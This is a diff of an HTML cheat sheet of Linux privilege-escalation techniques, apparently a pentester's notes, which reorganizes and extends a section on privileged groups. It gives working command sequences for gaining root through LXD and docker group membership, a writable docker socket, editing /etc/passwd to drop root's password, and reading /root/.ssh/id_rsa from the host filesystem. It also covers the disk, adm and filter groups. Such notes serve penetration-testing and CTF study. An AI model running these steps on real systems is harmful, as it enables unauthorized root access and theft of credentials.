@@ -113,6 +113,129 @@
 
                     <h2 id="GTFO bins alternative">GTFO bins alternative</h2>
                         <p>As you know GTFO bins UI changed and make it all difficult to read and they also hidden some privilege escalation paths. That way you can check the older version following the link <a href="https://web.archive.org/web/20260102075820/https://gtfobins.github.io/" class="notion-link">Here</a></p>
+                    
+                    <h2 id="Privileged groups">Privileged groups</h2>
+                    <ul>
+                        <p>First check your groups by using <b>id</b> command</p>
+                        <p>Check what your user can do <b>(read, write)</b> based on group membership</p>
+                        <pre><code class="language-bash">find / -group groupname 2>/dev/null</code></pre>
+
+                        <h3>mlocate group</h3>
+                        <ul>
+                            <p>The mlocate group is a dedicated system security group used in Linux to restrict direct read access to the centralized file name database. This database contains the names and locations of all files on the system.</p>
+                            <pre><code class="language-bash">/var/lib/mlocate/mlocate.db</code></pre>
+                            <p>If you are part of this group you can read the database directly. And this can be used to escalte privileges combined with other flaws</p>
+                        </ul>
+
+                        <h3>LXC / LXD group</h3>
+                        <ul>
+                            <p>LXD is similar to Docker and is Ubuntu's container manager. With this group you'll be able to obtain a shell as root</p>
+                            <p>Go to the following github repo and download the image (tar.gz) file</p>
+                            <pre><code class="language-bash">https://github.com/saghul/lxd-alpine-builder</code></pre>
+                            <p>In case you would like to create a recent image you can clone de repo and follow the steps to create it. Once you have the file transfer it to the victim</p>
+                            <p>Import the image</p>
+                            <pre><code class="language-bash">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias ubuntutemp</code></pre>
+                            <p>List images to check we did it correctly</p>
+                            <pre><code class="language-bash">lxc image list</code></pre>
+                            <p>Disables all isolation features that allow us to act on the host.</p>
+                            <pre><code class="language-bash">lxc init ubuntutemp privesc -c security.privileged=true</code></pre>
+                            <p>Add the root directory of our original machine where privesc is the name of the container</p>
+                            <pre><code class="language-bash">lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code></pre>
+                            <p>Start the container </p>
+                            <pre><code class="language-bash">lxc start privesc</code></pre>
+                            <p>Obtain a shell inside the container</p>
+                            <pre><code class="language-bash">lxc exec privesc /bin/bash #OR
+lxc exec privesc /bin/sh</code></pre>
+                            <p>In order to check the original host disk device just go to /mnt/root/</p>
+                        </ul>
+
+                        <h3>Docker group</h3>
+                        <ul>
+                            <p>In case you are in docker group youll be able to read any file on the system. By running the following command youll create a new container mounting the /root folder</p>
+                            <p>Since your box is likely to not have internet connection just use an image wich was already downloaded in the target machine</p>
+                            <pre><code class="language-bash">docker run -v /root:/mnt -it ubuntu</code></pre>
+                            <p>Then access the container and go to /mnt folder</p>
+                            <pre><code class="language-bash">docker exec -it e291179f4899 /bin/bash</code></pre>
+                            <p>Here are two easy options to escalate privileges:</p>
+
+                            <div class="button" onclick="toggleDiv()">Interactive shell as root by creating a new container</div>
+                                <div id="foldedDiv" class="content">
+                                    <pre><code class="language-bash">docker run -v /:/mnt --rm -it redmine chroot /mnt sh</code></pre>    
+                                    <p>In this case we are mounting all the host filesystem. With the <b>--rm</b> the container will be deleted after it exits, the <b>chroot /mnt sh</b></p>
+                                </div> 
+                            <br>
+                            <div class="button" onclick="toggleDiv()">Modfying /etc/passwd</div>
+                                <div id="foldedDiv" class="content">
+                                    <pre><code class="language-bash">docker run -v /etc:/mnt -it ubuntu</code></pre>
+                                    <p>Read the /etc/passwd file and copy it into your attacker box</p>
+                                    <p>Then just remove the <b>x</b> from the root line and copy it back to the container (meaning tranfer the file with python server)</p>
+                                    <p>Exit the container and perform <b>su root</b> without needing a password</p>
+                                    <pre><code class="language-bash">su root</code></pre>    
+                                </div>     
+
+
+
+                            <h4>Shared folders</h4>
+                            <ul>
+                            <p>In case there is already a container, running in the server and you are able to access you should check shared folders since in some times the / host folder may be mounted and you could access the host filesystem</p>
+                            <pre><code class="language-bash">/
+/mnt/
+/data/
+/srv/</code></pre>    
+                            </ul>
+
+                            <h4>Docker socket</h4>
+                            <ul>
+                                <p>In some cases we will find a file called docker.sock which is a special file that allows us and processes to communicate with the Docker daemon. Using that file we can create a new container mounting the host filesystem</p>
+                                <p>Normally this file is located in</p>
+                                <pre><code class="language-bash">/var/run/docker.sock
+/run/docker.sock</code></pre>
+                                <p>First check if we have the docker binary if negative download it from <a class="notion-link" href="https://master.dockerproject.com/linux/x86_64/docker">here</a></p>
+                                <p>Then check if we can list containers using the socket</p>
+                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock ps</code></pre>
+                                <p>Create a new privileged container mounting the host filesystem. In case you dont have any image you can check the <b>docker ps</b> if there are other containers and use the same image or even you can do <b>docker image ls</b> to list images</p>
+                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem docker_image
+#In case your container stops just after running the command use sleep infinity
+docker -H unix:///run/docker.sock run -d --privileged -v /:/hostsystem ubuntu sleep infinity
+                                </code></pre>
+                                <p>You can list again containers to check if all was okay</p>
+                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock ps</code></pre>
+                                <p>Now access the container</p>
+                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock exec -it container_id /bin/bash</code></pre>
+                                <p>Access the host filesystem</p>
+                                <pre><code class="language-bash">cat /hostsystem/root/.ssh/id_rsa</code></pre>
+                            </ul>
+
+                            <h4>Docker socket without privileges</h4>
+                            <ul>
+                                <p>In case we are not in docker group we still be able to access host filesystem but there is one condition. <b>Docker socket must be writable</b> then we can use</p>
+                                <pre><code class="language-bash">docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash</code></pre>
+                                
+                            </ul>
+                        </ul>
+                        
+                        <h3>Disk group</h3>
+                        <ul>
+                            <p>Users within the disk group have full access to any devices contained within /dev also /dev/sda1 which is the main device. An attacker whith this privielged can use <b>debugfs</b> to access the full filesystem</p>
+                        </ul>
+
+                        <h3>ADM group</h3>
+                        <ul>
+                            <p>Members of the adm group are able to read all logs stored in /var/log</p>
+                            <p>In case we are in this group we could use (if installed) <b>auerport</b> which is a tool used to review logs</p>
+                            <pre><code class="language-bash">aureport --tty</code></pre>
+                            <p>You can try with different flags to acquire several type of information. <a class="notion-link" href="https://linux.die.net/man/8/aureport">Here</a> you can find list of flags</p>
+                        </ul>
+
+                        <h3>filter group</h3>
+                        <ul>
+                            <p>In case you are part of a group name which is called "filter", in some ocasions this group is related with postfix which is a open mail server software</p>
+                            <p>Then just show which files are owned by the group:</p>
+                            <pre><code class="language-bash">find / -group filter 2>/dev/null</code></pre>
+                            <p>This can lead to being able to edit the file <b>/etc/postfix/disclaimer</b> which is a postfix disclaimer functionality where every time an email is sent this script will add some disclaimer related content at the end of the message</p>
+                            <p>Since this process is a little bit large, and contain several details, well explain it here</p>
+                        </ul>
+                </ul>    
 
                     <h2 id="Sudo & SUID">Sudo & SUID</h2>
                     <ul>
@@ -185,7 +308,8 @@ User daniel.carter may run the following commands on NIX02:
                         </ul>
                         <h3> SUID/SGID propietary execution </h3>
                         <ul>
-                            <li><b>SUID</b> The prcoess runs with the permissions of the owner </li>
+                            <p>Skip default SUID binaries <b>newgrp,passwd,sudo,chfn,chsh,gpasswd,su,mount,umount</b> .It's worth checking if appears any different like the ones listed</p>
+                            <li><b>SUID</b> The process runs with the permissions of the owner </li>
                             <pre><code class="language-bash">-rwsr-xr-x 1 root root file.txt  #Take a look where the s is</code></pre>
                             <p>List files with SUID (In this case we are filtering by root user <b>but we can remove it</b>)</p>
                             <pre><code class="language-bash">find / -type f -user root -perm -4000 2>/dev/null</code></pre>
@@ -562,119 +686,7 @@ logrotate 3.18.0</code></pre>
                         </ul>
                     </ul>
 
-                    <h2 id="Privileged groups">Privileged groups</h2>
-                    <ul>
-                        <p>First check your groups by using <b>id</b> command</p>
-
-                        <h4>mlocate group</h4>
-                        <ul>
-                            <p>The mlocate group is a dedicated system security group used in Linux to restrict direct read access to the centralized file name database. This database contains the names and locations of all files on the system.</p>
-                            <pre><code class="language-bash">/var/lib/mlocate/mlocate.db</code></pre>
-                            <p>If you are part of this group you can read the database directly. And this can be used to escalte privileges combined with other flaws</p>
-                        </ul>
-
-                        <h4>LXC / LXD group</h4>
-                        <ul>
-                            <p>LXD is similar to Docker and is Ubuntu's container manager. With this group you'll be able to obtain a shell as root</p>
-                            <p>Go to the following github repo and download the image (tar.gz) file</p>
-                            <pre><code class="language-bash">https://github.com/saghul/lxd-alpine-builder</code></pre>
-                            <p>In case you would like to create a recent image you can clone de repo and follow the steps to create it. Once you have the file transfer it to the victim</p>
-                            <p>Import the image</p>
-                            <pre><code class="language-bash">lxc image import alpine-v3.13-x86_64-20210218_0139.tar.gz --alias ubuntutemp</code></pre>
-                            <p>List images to check we did it correctly</p>
-                            <pre><code class="language-bash">lxc image list</code></pre>
-                            <p>Disables all isolation features that allow us to act on the host.</p>
-                            <pre><code class="language-bash">lxc init ubuntutemp privesc -c security.privileged=true</code></pre>
-                            <p>Add the root directory of our original machine where privesc is the name of the container</p>
-                            <pre><code class="language-bash">lxc config device add privesc host-root disk source=/ path=/mnt/root recursive=true</code></pre>
-                            <p>Start the container </p>
-                            <pre><code class="language-bash">lxc start privesc</code></pre>
-                            <p>Obtain a shell inside the container</p>
-                            <pre><code class="language-bash">lxc exec privesc /bin/bash #OR
-lxc exec privesc /bin/sh</code></pre>
-                            <p>In order to check the original host disk device just go to /mnt/root/</p>
-                        </ul>
-
-                        <h4>Docker group</h4>
-                        <ul>
-                            <p>In case you are in docker group youll be able to read any file on the system. By running the following command youll create a new container mounting the /root folder</p>
-                            <p>Since your box is likely to not have internet connection just use an image wich was already downloaded in the target machine</p>
-                            <pre><code class="language-bash">docker run -v /root:/mnt -it ubuntu</code></pre>
-                            <p>Then access the container and go to /mnt folder</p>
-                            <pre><code class="language-bash">docker exec -it e291179f4899 /bin/bash</code></pre>
-                            <p>Here are two easy options to escalate privileges:</p>
-
-                            <div class="button" onclick="toggleDiv()">Interactive shell as root by creating a new container</div>
-                                <div id="foldedDiv" class="content">
-                                    <pre><code class="language-bash">docker run -v /:/mnt --rm -it redmine chroot /mnt sh</code></pre>    
-                                    <p>In this case we are mounting all the host filesystem. With the <b>--rm</b> the container will be deleted after it exits, the <b>chroot /mnt sh</b></p>
-                                </div> 
-                            <br>
-                            <div class="button" onclick="toggleDiv()">Modfying /etc/passwd</div>
-                                <div id="foldedDiv" class="content">
-                                    <pre><code class="language-bash">docker run -v /etc:/mnt -it ubuntu</code></pre>
-                                    <p>Read the /etc/passwd file and copy it into your attacker box</p>
-                                    <p>Then just remove the <b>x</b> from the root line and copy it back to the container (meaning tranfer the file with python server)</p>
-                                    <p>Exit the container and perform <b>su root</b> without needing a password</p>
-                                    <pre><code class="language-bash">su root</code></pre>    
-                                </div>     
-
-
-
-                            <h5>Shared folders</h5>
-                            <ul>
-                            <p>In case there is already a container, running in the server and you are able to access you should check shared folders since in some times the / host folder may be mounted and you could access the host filesystem</p>
-                            <pre><code class="language-bash">/
-/mnt/
-/data/
-/srv/</code></pre>    
-                            </ul>
-
-                            <h5>Docker socket</h5>
-                            <ul>
-                                <p>In some cases we will find a file called docker.sock which is a special file that allows us and processes to communicate with the Docker daemon. Using that file we can create a new container mounting the host filesystem</p>
-                                <p>Normally this file is located in</p>
-                                <pre><code class="language-bash">/var/run/docker.sock
-/run/docker.sock</code></pre>
-                                <p>First check if we have the docker binary if negative download it from <a class="notion-link" href="https://master.dockerproject.com/linux/x86_64/docker">here</a></p>
-                                <p>Then check if we can list containers using the socket</p>
-                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock ps</code></pre>
-                                <p>Create a new privileged container mounting the host filesystem. In case you dont have any image you can check the <b>docker ps</b> if there are other containers and use the same image or even you can do <b>docker image ls</b> to list images</p>
-                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock run --rm -d --privileged -v /:/hostsystem docker_image
-#In case your container stops just after running the command use sleep infinity
-docker -H unix:///run/docker.sock run -d --privileged -v /:/hostsystem ubuntu sleep infinity
-                                </code></pre>
-                                <p>You can list again containers to check if all was okay</p>
-                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock ps</code></pre>
-                                <p>Now access the container</p>
-                                <pre><code class="language-bash">/tmp/docker -H unix:///app/docker.sock exec -it container_id /bin/bash</code></pre>
-                                <p>Access the host filesystem</p>
-                                <pre><code class="language-bash">cat /hostsystem/root/.ssh/id_rsa</code></pre>
-                            </ul>
-
-                            <h5>Docker socket without privileges</h5>
-                            <ul>
-                                <p>In case we are not in docker group we still be able to access host filesystem but there is one condition. <b>Docker socket must be writable</b> then we can use</p>
-                                <pre><code class="language-bash">docker -H unix:///var/run/docker.sock run -v /:/mnt --rm -it ubuntu chroot /mnt bash</code></pre>
-                                
-                            </ul>
-                        </ul>
-                        
-                        <h4>Disk group</h4>
-                        <ul>
-                            <p>Users within the disk group have full access to any devices contained within /dev also /dev/sda1 which is the main device. An attacker whith this privielged can use <b>debugfs</b> to access the full filesystem</p>
-                        </ul>
-
-                        <h4>ADM grup</h4>
-                        <ul>
-                            <p>Members of the adm group are able to read all logs stored in /var/log</p>
-                            <p>In case we are in this group we could use (if installed) <b>auerport</b> which is a tool used to review logs</p>
-                            <pre><code class="language-bash">aureport --tty</code></pre>
-                            <p>You can try with different flags to acquire several type of information. <a class="notion-link" href="https://linux.die.net/man/8/aureport">Here</a> you can find list of flags</p>
-
-
-                    </ul>
-                </ul>
+                    
         </div>
     </div>
 </body>
